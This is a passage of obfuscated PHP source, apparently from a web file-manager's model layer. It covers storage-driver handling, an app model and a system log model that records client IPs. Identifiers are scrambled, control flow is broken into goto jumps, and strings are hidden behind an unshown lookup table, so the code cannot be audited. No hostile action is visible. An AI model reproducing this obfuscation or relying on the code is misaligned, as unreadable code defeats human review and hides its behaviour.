bç–¶¶¯³ğ: foreach ($A÷÷Ÿ¡â˜£ as $AÏ Ä½Ö¢ => $FÉ»éªÊÕÏ) { $A÷÷Ÿ¡â˜£[$AÏ Ä½Ö¢] = trim($FÉ»éªÊÕÏ); } $b†ÈÉğÀ¸ = rtrim($A÷÷Ÿ¡â˜£[$dœ²»ğŠÙÅ[769]], $dœ²»ğŠÙÅ[8]) . $dœ²»ğŠÙÅ[8]; $dª¯áÔ¶Ÿ = $this->driverType($DÜß†¯Ñ°†); goto cÀÍõßÕ“°; f««¹Óá°Ç: $aÄ‡Ê¾ˆİé = $bëÃñÄ›§Ø->getPath($b†ÈÉğÀ¸ . $dœ²»ğŠÙÅ[1388]); if (!$bëÃñÄ›§Ø->mkfile($aÄ‡Ê¾ˆİé)) { show_json(LNG($dœ²»ğŠÙÅ[1797]), !1); } $A÷÷Ÿ¡â˜£[$dœ²»ğŠÙÅ[769]] = $b†ÈÉğÀ¸; goto FŞ‡¶ÂØ×â; dùæƒ‚ƒÊ¡: $dœ²»ğŠÙÅ =& $_SERVER[İåâé¾]; $DÜß†¯Ñ°† = strtolower($A“š¸Á«Ù´[$dœ²»ğŠÙÅ[89]]); $A÷÷Ÿ¡â˜£ = json_decode_force($A“š¸Á«Ù´[$dœ²»ğŠÙÅ[6]]); goto bç–¶¶¯³ğ; FŞ‡¶ÂØ×â: $A“š¸Á«Ù´[$dœ²»ğŠÙÅ[6]] = json_encode($A÷÷Ÿ¡â˜£); $A“š¸Á«Ù´[$dœ²»ğŠÙÅ[89]] = $dª¯áÔ¶Ÿ; return !0; goto CÉÚÏ‡¦¬–; CÉÚÏ‡¦¬–: } private function driverType($F÷»Ã˜ÙŒç) { $B¤æù‹ÁœÎ =& $_SERVER[İåâé¾]; $F¸ÚÄÈìø = array($B¤æù‹ÁœÎ[100] => $B¤æù‹ÁœÎ[1798], $B¤æù‹ÁœÎ[58] => $B¤æù‹ÁœÎ[1799], $B¤æù‹ÁœÎ[65] => $B¤æù‹ÁœÎ[770]); if (isset($F¸ÚÄÈìø[$F÷»Ã˜ÙŒç])) { return $F¸ÚÄÈìø[$F÷»Ã˜ÙŒç]; } return strtoupper($F÷»Ã˜ÙŒç); } public function driverListSystem() { $F†ã™ÕøĞ =& $_SERVER[İåâé¾]; $d’ôÓ¸„á = parent::listData(); $aòÌõÕõ = array(); foreach ($d’ôÓ¸„á as $BÔÁªŒœ) { unset($BÔÁªŒœ[$F†ã™ÕøĞ[186]], $BÔÁªŒœ[$F†ã™ÕøĞ[105]]); $BÔÁªŒœ[$F†ã™ÕøĞ[6]] = json_decode_force($BÔÁªŒœ[$F†ã™ÕøĞ[6]]); $aòÌõÕõ[] = $BÔÁªŒœ; } return $aòÌõÕõ; } public function defaultDriver() { $eµ•¬ëĞ =& $_SERVER[İåâé¾]; $B‚Èš×­‰ = parent::listData(); $bŠÃÉùšÇÜ = array_filter_by_field($B‚Èš×­‰, $eµ•¬ëĞ[34], 1); $bŠÃÉùšÇÜ = $bŠÃÉùšÇÜ[0]; if ($bŠÃÉùšÇÜ) { $bŠÃÉùšÇÜ[$eµ•¬ëĞ[6]] = json_decode($bŠÃÉùšÇÜ[$eµ•¬ëĞ[6]], !0); } return $bŠÃÉùšÇÜ; } public function driverInfo($fåÖœÈœÒ‚) { $f™×²ÈäÊÎ =& $_SERVER[İåâé¾]; $dœ¥Ö÷·Ä˜ = array_to_keyvalue(parent::listData(), $f™×²ÈäÊÎ[368]); if (!isset($dœ¥Ö÷·Ä˜[$fåÖœÈœÒ‚])) { return !1; } $AĞ¯ù¨ïà = $dœ¥Ö÷·Ä˜[$fåÖœÈœÒ‚]; $AĞ¯ù¨ïà[$f™×²ÈäÊÎ[6]] = json_decode_force($AĞ¯ù¨ïà[$f™×²ÈäÊÎ[6]]); return $AĞ¯ù¨ïà; } public function removeWithFile($Fõ°È¬¶ÈÂ) { goto cÂìø‹öéè; E™„ùùƒ®: $dÆç¸½Ü¾Š = Model($EòÕŒ«¯Ç‰[163])->where($eóÂšëì×¸)->field($EòÕŒ«¯Ç‰[1803])->select(); foreach ($dÆç¸½Ü¾Š as $B˜Š²Î™Âì) { goto CÓÍƒäŒÕÖ; Dá‹õÉ·î: if (!IO::exist($b‰Šİ¡†‰) && !IO::move($Eà²çÁßƒ¥, $b‰Šİ¡†‰)) { continue; } $eóÂšëì×¸ = array($EòÕŒ«¯Ç‰[382] => $B˜Š²Î™Âì[$EòÕŒ«¯Ç‰[382]]); $e›«Ûîğî¸ = array($EòÕŒ«¯Ç‰[480] => $fõ”Õ‘Å¸, $EòÕŒ«¯Ç‰[76] => $b‰Šİ¡†‰); goto bù¸ËŒİ´Ú; CÓÍƒäŒÕÖ: $Eà²çÁßƒ¥ = $B˜Š²Î™Âì[$EòÕŒ«¯Ç‰[76]]; $b‰Šİ¡†‰ = $C÷²Ú„ÑŸÔ . str_replace("\173\x69\x6f\72{$Fõ°È¬¶ÈÂ}\x7d\x2f", $EòÕŒ«¯Ç‰[33], $Eà²çÁßƒ¥); if (!IO::exist($Eà²çÁßƒ¥)) { $this->removeByFileID($B˜Š²Î™Âì[$EòÕŒ«¯Ç‰[382]]); continue; } goto Dá‹õÉ·î; bù¸ËŒİ´Ú: Model($EòÕŒ«¯Ç‰[163])->where($eóÂšëì×¸)->save($e›«Ûîğî¸); goto cÕ´³¸ã‚; cÕ´³¸ã‚: } return parent::remove($Fõ°È¬¶ÈÂ); goto CµŸòØÙ‹£; cÂìø‹öéè: $EòÕŒ«¯Ç‰ =& $_SERVER[İåâé¾]; $eóÂšëì×¸ = array($EòÕŒ«¯Ç‰[480] => $Fõ°È¬¶ÈÂ); $Aöğ­ÂÏ¹† = Model($EòÕŒ«¯Ç‰[411])->where($eóÂšëì×¸)->count(); goto cèÎšË¦©; E‘¶Ö«¤ò: $fÂ«§…›˜õ = KodIO::defaultDriver(); $fõ”Õ‘Å¸ = $fÂ«§…›˜õ[$EòÕŒ«¯Ç‰[368]]; $C÷²Ú„ÑŸÔ = "\173\x69\x6f\72{$fõ”Õ‘Å¸}\x7d\x2f"; goto E™„ùùƒ®; cèÎšË¦©: $FË„Ô©‚¸Í = Model($EòÕŒ«¯Ç‰[411])->where($eóÂšëì×¸)->sum($EòÕŒ«¯Ç‰[78]); $e‚ù¸Å‘Í¶ = new TaskFileTransfer($EòÕŒ«¯Ç‰[1800] . $Fõ°È¬¶ÈÂ, $EòÕŒ«¯Ç‰[1801], $Aöğ­ÂÏ¹†, LNG($EòÕŒ«¯Ç‰[1802]) . "\x28{$Fõ°È¬¶ÈÂ}\51"); $e‚ù¸Å‘Í¶->task[$EòÕŒ«¯Ç‰[455]] = $FË„Ô©‚¸Í; goto E‘¶Ö«¤ò; CµŸòØÙ‹£: } public function progress($Eìä‰•×ºÖ) { return Task::get($_SERVER[İåâé¾][1800] . $Eìä‰•×ºÖ); } private function removeByFileID($c÷™… øë) { $Cö¨Üó•¸„ =& $_SERVER[İåâé¾]; $e” šË»“Í = Model($Cö¨Üó•¸„[850])->field($Cö¨Üó•¸„[1777])->where(array($Cö¨Üó•¸„[382] => $c÷™… øë))->select(); $e” šË»“Í = array_to_keyvalue($e” šË»“Í, $Cö¨Üó•¸„[33], $Cö¨Üó•¸„[374]); foreach ($e” šË»“Í as $a†Íá„) { Model($Cö¨Üó•¸„[978])->remove($a†Íá„, !1); } } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x4c\151\x67\150\164\101\x70\x70"; public $modelType = "\123\x79\x73\164\x65\155\117\x70\x74\x69\157\x6e"; public $field = array("\x6e\x61\155\145", "\147\162\157\x75\160", "\x64\x65\x73\143", "\143\x6f\x6e\164\145\156\x74"); public function listData($B’¿®İ÷¡ = false, $aà¬ùÄêš‰ = "\155\157\x64\x69\146\171\124\151\x6d\145", $aê±¶±Ë¸¼ = true) { return parent::listData($B’¿®İ÷¡, $aà¬ùÄêš‰, $aê±¶±Ë¸¼); } public function remove($AÏ¢¢ê½ÛÕ) { $eø«…â‹Õ = $this->findByName($AÏ¢¢ê½ÛÕ); if (!$eø«…â‹Õ) { return !1; } return parent::remove($eø«…â‹Õ[$_SERVER[İåâé¾][368]]); } public function add($AâËå¡ ÒÙ) { if ($this->findByName($AâËå¡ ÒÙ[$_SERVER[İåâé¾][28]])) { return !1; } return parent::insert($AâËå¡ ÒÙ); } public function update($fÎ†ê¶¨ˆ‹, $Eˆ§Ñ›™áà) { $dÒÉ¾—æ™× =& $_SERVER[İåâé¾]; $B¼ˆ²’¥¿ = $this->findByName($fÎ†ê¶¨ˆ‹); $d“œŸ¾ÉÅß = $this->findByName($Eˆ§Ñ›™áà[$dÒÉ¾—æ™×[28]]); if (!$B¼ˆ²’¥¿ || $d“œŸ¾ÉÅß && $d“œŸ¾ÉÅß[$dÒÉ¾—æ™×[368]] != $B¼ˆ²’¥¿[$dÒÉ¾—æ™×[368]]) { return !1; } return parent::update($B¼ˆ²’¥¿[$dÒÉ¾—æ™×[368]], $Eˆ§Ñ›™áà); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\156\163\145\x72\164", "\x66\165\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $C °óé·ï­ =& $_SERVER[İåâé¾]; return array($C °óé·ï­[1804] => LNG($C °óé·ï­[1805]), $C °óé·ï­[1806] => LNG($C °óé·ï­[1807]), $C °óé·ï­[1482] => LNG($C °óé·ï­[1808]), $C °óé·ï­[1809] => LNG($C °óé·ï­[1810]), $C °óé·ï­[1811] => LNG($C °óé·ï­[1812]), $C °óé·ï­[1813] => LNG($C °óé·ï­[1814]), $C °óé·ï­[1815] => LNG($C °óé·ï­[1816]), $C °óé·ï­[1817] => LNG($C °óé·ï­[1818]), $C °óé·ï­[1514] => LNG($C °óé·ï­[1819]), $C °óé·ï­[1820] => LNG($C °óé·ï­[1821]), $C °óé·ï­[1822] => LNG($C °óé·ï­[1823]), $C °óé·ï­[1824] => LNG($C °óé·ï­[1825]), $C °óé·ï­[1826] => LNG($C °óé·ï­[1827]), $C °óé·ï­[1512] => LNG($C °óé·ï­[1828]), $C °óé·ï­[1517] => LNG($C °óé·ï­[1829]), $C °óé·ï­[1830] => LNG($C °óé·ï­[1831]), $C °óé·ï­[1832] => LNG($C °óé·ï­[1833]), $C °óé·ï­[1834] => LNG($C °óé·ï­[1835]), $C °óé·ï­[1836] => LNG($C °óé·ï­[1837]), $C °óé·ï­[1520] => LNG($C °óé·ï­[1838]), $C °óé·ï­[1521] => LNG($C °óé·ï­[1839]), $C °óé·ï­[1840] => LNG($C °óé·ï­[1841]), $C °óé·ï­[1842] => LNG($C °óé·ï­[1843]), $C °óé·ï­[1844] => LNG($C °óé·ï­[1845]), $C °óé·ï­[1846] => LNG($C °óé·ï­[1847]), $C °óé·ï­[1848] => LNG($C °óé·ï­[1849]), $C °óé·ï­[1515] => LNG($C °óé·ï­[1850]), $C °óé·ï­[1851] => LNG($C °óé·ï­[1852]), $C °óé·ï­[1853] => LNG($C °óé·ï­[1854]), $C °óé·ï­[1855] => LNG($C °óé·ï­[1855]), $C °óé·ï­[1856] => LNG($C °óé·ï­[1486]), $C °óé·ï­[1857] => LNG($C °óé·ï­[1858]), $C °óé·ï­[1859] => LNG($C °óé·ï­[1860]), $C °óé·ï­[1861] => LNG($C °óé·ï­[1862]), $C °óé·ï­[1863] => LNG($C °óé·ï­[1864]), $C °óé·ï­[1865] => LNG($C °óé·ï­[1865]), $C °óé·ï­[1866] => LNG($C °óé·ï­[1867]), $C °óé·ï­[1868] => LNG($C °óé·ï­[1869]), $C °óé·ï­[1870] => LNG($C °óé·ï­[1871]), $C °óé·ï­[1872] => LNG($C °óé·ï­[1873]), $C °óé·ï­[1874] => LNG($C °óé·ï­[1875]), $C °óé·ï­[1876] => LNG($C °óé·ï­[1877])); } private function typeFile() { $CÎ¹á ò¦î =& $_SERVER[İåâé¾]; $AİÙ›éØ˜ô = array($CÎ¹á ò¦î[1517] => array($CÎ¹á ò¦î[1518]), $CÎ¹á ò¦î[1824] => array($CÎ¹á ò¦î[1878]), $CÎ¹á ò¦î[1826] => array($CÎ¹á ò¦î[1879]), $CÎ¹á ò¦î[1512] => array($CÎ¹á ò¦î[1513]), $CÎ¹á ò¦î[1832] => array(), $CÎ¹á ò¦î[1834] => array(), $CÎ¹á ò¦î[1836] => array(), $CÎ¹á ò¦î[1520] => array($CÎ¹á ò¦î[1522]), $CÎ¹á ò¦î[1521] => array($CÎ¹á ò¦î[1522]), $CÎ¹á ò¦î[1840] => array($CÎ¹á ò¦î[1880]), $CÎ¹á ò¦î[1842] => array($CÎ¹á ò¦î[1880]), $CÎ¹á ò¦î[1844] => array($CÎ¹á ò¦î[1881]), $CÎ¹á ò¦î[1830] => array($CÎ¹á ò¦î[1882]), $CÎ¹á ò¦î[1846] => array($CÎ¹á ò¦î[1883]), $CÎ¹á ò¦î[1848] => array($CÎ¹á ò¦î[1884]), $CÎ¹á ò¦î[1515] => array($CÎ¹á ò¦î[1516])); return $AİÙ›éØ˜ô; } private function typeAll() { goto Dî¿ò¾£ùÔ; Dî¿ò¾£ùÔ: $AëÄíÎ×è =& $_SERVER[İåâé¾]; $b¦ŒÌ‡¾±… = $this->typeList; $F½Á©Â´ = array_filter($this->typeFile()); goto DŸ†¤ù—¬İ; FÑáá…–“Š: return $b¦ŒÌ‡¾±…; goto F” ÍÕ±¶; DŸ†¤ù—¬İ: foreach ($F½Á©Â´ as $cì©‘‘ÄšÎ => $Còˆ§¤ìó‹) { $b¦ŒÌ‡¾±…[$Còˆ§¤ìó‹[0]] = $b¦ŒÌ‡¾±…[$cì©‘‘ÄšÎ]; } $b¦ŒÌ‡¾±…[$AëÄíÎ×è[1522]] = LNG($AëÄíÎ×è[1885]); $b¦ŒÌ‡¾±…[$AëÄíÎ×è[1880]] = LNG($AëÄíÎ×è[1886]); goto FÑáá…–“Š; F” ÍÕ±¶: } public function addLog($Eº©‚«‘§‚, $Cî©ì§½¥á = array()) { goto C¾¦Òï²ã¸; f´°¶Ã¼ã£: $A÷°‹ÙïÎŸ = get_client_ip(); if (!$Cî©ì§½¥á || strlen(json_encode($Cî©ì§½¥á)) >= 1024) { $Cî©ì§½¥á = array($D¡™‰‡ÇÍó[1887] => $A÷°‹ÙïÎŸ); } else { if (is_array($Cî©ì§½¥á)) { $Cî©ì§½¥á[$D¡™‰‡ÇÍó[1887]] = $A÷°‹ÙïÎŸ; } else { $Cî©ì§½¥á = array($D¡™‰‡ÇÍó[782] => $Cî©ì§½¥á, $D¡™‰‡ÇÍó[1887] => $A÷°‹ÙïÎŸ); } } $Cî©ì§½¥á = array($D¡™‰‡ÇÍó[1076] => Session::sign(), $D¡™‰‡ÇÍó[1077] => $F ¾÷àÁĞº, $D¡™‰‡ÇÍó[29] => $Eº©‚«‘§‚, $D¡™‰‡ÇÍó[1079] => json_encode($Cî©ì§½¥á)); goto D•É…ƒ±“’; C¾¦Òï²ã¸: $D¡™‰‡ÇÍó =& $_SERVER[İåâé¾]; if (!isset($this->typeList[$Eº©‚«‘§‚])) { return; } $F ¾÷àÁĞº = USER_ID ? USER_ID : (isset($Cî©ì§½¥á[$D¡™‰‡ÇÍó[1086]]) ? $Cî©ì§½¥á[$D¡™‰‡ÇÍó[1086]] : 0); goto f´°¶Ã¼ã£; D•É…ƒ±“’: parent::add($Cî©ì§½¥á); goto cé‘áÊë®; cé‘áÊë®: } public function remove($CĞƒ®Ù­õ) { $this->where(array($_SERVER[İåâé¾][812] => $CĞƒ®Ù­õ))->delete(); } private function _makeOrder($AÒáí¸á¨Ü = '') { goto Dõ–Şö¹; CÁéôá®§: return $this->order($AÒáí¸á¨Ü); goto cç£¼ÎîÀ¿; d×Œ†Şƒ¼ã: $C–Ãååí° = Input::get($DÌàÆˆæ¶Ê[1584], $DÌàÆˆæ¶Ê[7], $DÌàÆˆæ¶Ê[1686], array($DÌàÆˆæ¶Ê[1630], $DÌàÆˆæ¶Ê[1509])); $C–Ãååí° = $dŠ”ø©‘±»[$C–Ãååí°]; $AÒáí¸á¨Ü = $AÒáí¸á¨Ü . "{$C‘¬‡×µ¥Ü}\x20{$C–Ãååí°}"; goto CÁéôá®§; Dõ–Şö¹: $DÌàÆˆæ¶Ê =& $_SERVER[İåâé¾]; $C‘¬‡×µ¥Ü = $DÌàÆˆæ¶Ê[186]; $dŠ”ø©‘±» = array($DÌàÆˆæ¶Ê[1628] => $DÌàÆˆæ¶Ê[1629], $DÌàÆˆæ¶Ê[1509] => $DÌàÆˆæ¶Ê[1586]); goto d×Œ†Şƒ¼ã; cç£¼ÎîÀ¿: } public function get($e¶¯‰¾ºŞ¸ = '') { goto AÏ©¤÷â³ò; AÏ©¤÷â³ò: $B¨í·ÚÆß =& $_SERVER[İåâé¾]; if (!$e¶¯‰¾ºŞ¸) { show_json(array()); } $eÓÁ»ÚÇ£î = array(); goto b¿•ÈÉ¬ùÙ; FïÉ©˜Õš‹: return $E‹Ş£±ÅÄ‚; goto E¢­‡†½¯ª; F«‚¯¸’­¾: $E‹Ş£±ÅÄ‚ = $this->_makeOrder()->where($eÓÁ»ÚÇ£î)->selectPage(); if (empty($E‹Ş£±ÅÄ‚[$B¨í·ÚÆß[356]])) { show_json(array(), !0, $E‹Ş£±ÅÄ‚[$B¨í·ÚÆß[353]]); } $E‹Ş£±ÅÄ‚[$B¨í·ÚÆß[356]] = $this->logList($E‹Ş£±ÅÄ‚[$B¨í·ÚÆß[356]]); goto FïÉ©˜Õš‹; b¿•ÈÉ¬ùÙ: if ($e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[1086]]) { $eÓÁ»ÚÇ£î[$B¨í·ÚÆß[1086]] = $e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[1086]]; } if (isset($e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[459]])) { $b·É¶á¯ = $e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[459]]; $fâ•‰‚´Ü‰ = isset($e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[460]]) ? $e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[460]] : time(); $eÓÁ»ÚÇ£î[$B¨í·ÚÆß[186]] = array($B¨í·ÚÆß[324], array($b·É¶á¯, $fâ•‰‚´Ü‰)); } if ($e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[29]]) { $bÛ‡Ï‡ÖŸÜ = explode($B¨í·ÚÆß[47], $e¶¯‰¾ºŞ¸[$B¨í·ÚÆß[29]]); $eÖäÚø†Ä¯ = $this->typeFile(); $f¯ôÎ–ñ = array(); foreach ($bÛ‡Ï‡ÖŸÜ as $C™êˆƒÅÛ ) { $f¯ôÎ–ñ[] = $C™êˆƒÅÛ ; if (isset($eÖäÚø†Ä¯[$C™êˆƒÅÛ ])) { $f¯ôÎ–ñ = array_merge($f¯ôÎ–ñ, $eÖäÚø†Ä¯[$C™êˆƒÅÛ ]); } } $f¯ôÎ–ñ = array_unique($f¯ôÎ–ñ); if ($f¯ôÎ–ñ) { $eÓÁ»ÚÇ£î[$B¨í·ÚÆß[29]] = array($B¨í·ÚÆß[7], $f¯ôÎ–ñ); } } goto F«‚¯¸’­¾; E¢­‡†½¯ª: } private function ipAddress(&$bÕ’´´íâ) { $aŒäÄ’È£ =& $_SERVER[İåâé¾]; if (!empty($bÕ’´´íâ[$aŒäÄ’È£[1887]])) { $f¼óÊ»Æ = IpLocation::get($bÕ’´´íâ[$aŒäÄ’È£[1887]]); if ($f¼óÊ»Æ == $aŒäÄ’È£[1888]) { $f¼óÊ»Æ = $aŒäÄ’È£[1889]; } } else { $f¼óÊ»Æ = LNG($aŒäÄ’È£[1890]); } $bÕ’´´íâ[$aŒäÄ’È£[1891]] = $f¼óÊ»Æ; } private function getSourceList(&$b¼ÜêÔ…¨) { $D§À²”ë =& $_SERVER[İåâé¾]; $EÎÖÆíæ¨’ = array(); foreach ($b¼ÜêÔ…¨ as $c£¬£¢•ÎÅ => $Féƒ÷Ç™å) { $bŒ½Âê¥ïƒ = json_decode($Féƒ÷Ç™å[$D§À²”ë[1586]], !0); if (strpos($Féƒ÷Ç™å[$D§À²”ë[29]], $D§À²”ë[1724]) !== 0) { goto d¿Ñí§Æ«Ç; F„´á™ÑÖ©: continue; goto F¾ÜæÑ¬šÈ; DƒØßÌ·Ş: $EÎÖÆíæ¨’[] = $bŒ½Âê¥ïƒ[$D§À²”ë[374]] = $B¾“ˆôİ™ì[$D§À²”ë[374]]; $EÎÖÆíæ¨’[] = $bŒ½Âê¥ïƒ[$D§À²”ë[1723]] = $B¾“ˆôİ™ì[$D§À²”ë[384]]; $b¼ÜêÔ…¨[$c£¬£¢•ÎÅ][$D§À²”ë[1586]] = json_encode($bŒ½Âê¥ïƒ); goto F„´á™ÑÖ©; d¿Ñí§Æ«Ç: if (!isset($bŒ½Âê¥ïƒ[$D§À²”ë[76]]) || strpos($Féƒ÷Ç™å[$D§À²”ë[29]], $D§À²”ë[1892]) !== 0) { continue; } if (!IO::init($bŒ½Âê¥ïƒ[$D§À²”ë[76]])) { continue; } if (!($B¾“ˆôİ™ì = IO::infoFull($bŒ½Âê¥ïƒ[$D§À²”ë[76]]))) { continue; } goto DƒØßÌ·Ş; F¾ÜæÑ¬šÈ: } $EÎÖÆíæ¨’[] = $bŒ½Âê¥ïƒ[$D§À²”ë[374]]; $EÎÖÆíæ¨’[] = $bŒ½Âê¥ïƒ[$D§À²”ë[1723]]; if ($bŒ½Âê¥ïƒ[$D§À²”ë[29]] == $D§À²”ë[741]) { $EÎÖÆíæ¨’[] = $bŒ½Âê¥ïƒ[$D§À²”ë[1586]][$D§À²”ë[751]]; $EÎÖÆíæ¨’[] = $bŒ½Âê¥ïƒ[$D§À²”ë[1586]][$D§À²”ë[752]]; } if ($bŒ½Âê¥ïƒ[$D§À²”ë[29]] == $D§À²”ë[1727]) { $EÎÖÆíæ¨’[] = $bŒ½Âê¥ïƒ[$D§À²”ë[1586]][$D§À²”ë[374]]; } } if (!$EÎÖÆíæ¨’) { return array(); } return Model($D§À²”ë[521])->sourceListInfo($EÎÖÆíæ¨’, !0); } private function logList($d×æíÌª¹) { goto aŠ†ÉÓõ®; e­Ø‚ä«šá: foreach ($d×æíÌª¹ as $d×ˆªÚåÛ„ => $BâÄ÷¬á—) { goto eÕä¶®ğ; eÕä¶®ğ: $BÇÕ«öƒÃÚ = $BâÄ÷¬á—[$c¢çÏÇ¬÷[29]]; $E›íµÇ´Â = $BâÄ÷¬á—[$c¢çÏÇ¬÷[1086]]; $BâÄ÷¬á—[$c¢çÏÇ¬÷[28]] = isset($fíô«ÕÎÌ[$E›íµÇ´Â][$c¢çÏÇ¬÷[28]]) ? $fíô«ÕÎÌ[$E›íµÇ´Â][$c¢çÏÇ¬÷[28]] : LNG($c¢çÏÇ¬÷[1890]); goto E‰“¸ İÀ; E‰“¸ İÀ: $BâÄ÷¬á—[$c¢çÏÇ¬÷[1767]] = isset($fíô«ÕÎÌ[$E›íµÇ´Â][$c¢çÏÇ¬÷[1767]]) ? $fíô«ÕÎÌ[$E›íµÇ´Â][$c¢çÏÇ¬÷[1767]] : $c¢çÏÇ¬÷[33]; $BâÄ÷¬á—[$c¢çÏÇ¬÷[996]] = isset($EÉ±¼—ëÔ[$BÇÕ«öƒÃÚ]) ? $EÉ±¼—ëÔ[$BÇÕ«öƒÃÚ] : (strpos($BÇÕ«öƒÃÚ, $c¢çÏÇ¬÷[1893]) == 0 ? LNG($c¢çÏÇ¬÷[1894]) : LNG($c¢çÏÇ¬÷[1890])); $BâÄ÷¬á—[$c¢çÏÇ¬÷[1685]] = isset($fíô«ÕÎÌ[$E›íµÇ´Â]) ? $fíô«ÕÎÌ[$E›íµÇ´Â] : !1; goto eçù¡İêù; eçù¡İêù: $Aƒ•«¿Œò = json_decode($BâÄ÷¬á—[$c¢çÏÇ¬÷[1586]], !0); $BâÄ÷¬á—[$c¢çÏÇ¬÷[1887]] = isset($Aƒ•«¿Œò[$c¢çÏÇ¬÷[1887]]) ? $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1887]] : $c¢çÏÇ¬÷[33]; $this->ipAddress($BâÄ÷¬á—); goto A›œÄ¬ÊŸÉ; A›œÄ¬ÊŸÉ: if (strpos($BÇÕ«öƒÃÚ, $c¢çÏÇ¬÷[1724]) === 0 || isset($Aƒ•«¿Œò[$c¢çÏÇ¬÷[1723]])) { goto cš¶¦èÕ; Dó»ªÃÂ–÷: if ($Aƒ•«¿Œò[$c¢çÏÇ¬÷[1733]] && $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1733]][$c¢çÏÇ¬÷[393]] == $c¢çÏÇ¬÷[822]) { unset($d×æíÌª¹[$d×ˆªÚåÛ„]); continue; } goto e„¿ ®©«; F˜Ï×ÔŒ: if ($Aƒ•«¿Œò[$c¢çÏÇ¬÷[29]] == $c¢çÏÇ¬÷[1727]) { $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1586]][$c¢çÏÇ¬÷[374]] = $DÑÕ†ß­‚ß[$Aƒ•«¿Œò[$c¢çÏÇ¬÷[1586]][$c¢çÏÇ¬÷[374]]]; } if ($Aƒ•«¿Œò[$c¢çÏÇ¬÷[29]] == $c¢çÏÇ¬÷[1510]) { $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1733]] = $Aƒ•«¿Œò[$c¢çÏÇ¬÷[856]]; $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1723]] = $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1733]][$c¢çÏÇ¬÷[374]]; $Aƒ•«¿Œò[$c¢çÏÇ¬÷[856]] = !1; $Aƒ•«¿Œò[$c¢çÏÇ¬÷[374]] = $c¢çÏÇ¬÷[33]; } if ($Aƒ•«¿Œò[$c¢çÏÇ¬÷[856]] && $Aƒ•«¿Œò[$c¢çÏÇ¬÷[856]][$c¢çÏÇ¬÷[393]] == $c¢çÏÇ¬÷[822]) { unset($d×æíÌª¹[$d×ˆªÚåÛ„]); continue; } goto Dó»ªÃÂ–÷; cš¶¦èÕ: $Aƒ•«¿Œò[$c¢çÏÇ¬÷[856]] = $DÑÕ†ß­‚ß[$Aƒ•«¿Œò[$c¢çÏÇ¬÷[374]]]; $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1733]] = $DÑÕ†ß­‚ß[$Aƒ•«¿Œò[$c¢çÏÇ¬÷[1723]]]; if ($Aƒ•«¿Œò[$c¢çÏÇ¬÷[29]] == $c¢çÏÇ¬÷[741]) { $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1586]][$c¢çÏÇ¬÷[751]] = $DÑÕ†ß­‚ß[$Aƒ•«¿Œò[$c¢çÏÇ¬÷[1586]][$c¢çÏÇ¬÷[751]]]; $Aƒ•«¿Œò[$c¢çÏÇ¬÷[1586]][$c¢çÏÇ¬÷[752]] = $DÑÕ†ß­‚ß[$Aƒ•«¿Œò[$c¢çÏÇ¬÷[1586]][$c¢çÏÇ¬÷[752]]]; } goto F˜Ï×ÔŒ; e„¿ ®©«: } $BâÄ÷¬á—[$c¢çÏÇ¬÷[1586]] = $Aƒ•«¿Œò; $bà–½œ¤Ş‡[] = $BâÄ÷¬á—; goto d­Ã‹ÇÚéò; d­Ã‹ÇÚéò: } return $bà–½œ¤Ş‡; goto cŒÖîÙÇø´; aŠ†ÉÓõ®: $c¢çÏÇ¬÷ =& $_SERVER[İåâé¾]; $C¤† ”ß¿Î = array_to_keyvalue($d×æíÌª¹, $c¢çÏÇ¬÷[33], $c¢çÏÇ¬÷[1086]); $fíô«ÕÎÌ = Model($c¢çÏÇ¬÷[1477])->userListInfo(array_unique($C¤† ”ß¿Î)); goto Aá´™å×¯¿; Aá´™å×¯¿: $DÑÕ†ß­‚ß = $this->getSourceList($d×æíÌª¹); $EÉ±¼—ëÔ = $this->typeAll(); $bà–½œ¤Ş‡ = array(); goto e­Ø‚ä«šá; cŒÖîÙÇø´: } } goto BãñŠÚ×½; f¸ê÷Ç¤Ô: class Input { public static function getArray($d‹ğö³±) { goto B¡ò—ñø¤; AÒ‘èöùÇŸ: if (count($a õÒÜ¯) > 0) { show_json(implode($fé³ÚÜšÕ™[1271], $a õÒÜ¯), !1); } return $Dä¼Ì­ÂšØ; goto FƒÍÕ‚Ó§; cï†Æñ‘Ì•: $a õÒÜ¯ = array(); $aƒ«ØºßÒ = LNG($fé³ÚÜšÕ™[1266]); foreach ($d‹ğö³± as $c®ª„°êƒ† => $EÕ®·Áé¨ó) { goto C·ìöº¡â; C·ìöº¡â: $fËÎõİÓ–¿ = _get($EÕ®·Áé¨ó, $fé³ÚÜšÕ™[1267], $aƒ«ØºßÒ . $fé³ÚÜšÕ™[646] . $c®ª„°êƒ†); $aÌŒáæšÍõ = $c®ª„°êƒ†; if (isset($EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1268]]) && $EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1268]]) { $aÌŒáæšÍõ = $EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1268]]; } goto A¨ÔéÀ¤ªÇ; A¶·ğ—ˆ”: if (isset($EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1270]]) && !self::check($in[$c®ª„°êƒ†], $EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1270]], $A–¼›«Æ¾š)) { if (array_key_exists($fé³ÚÜšÕ™[1269], $EÕ®·Áé¨ó)) { if (!is_null($EÕ®·Áé¨ó[$fé³ÚÜšÕ™[1269]])) { 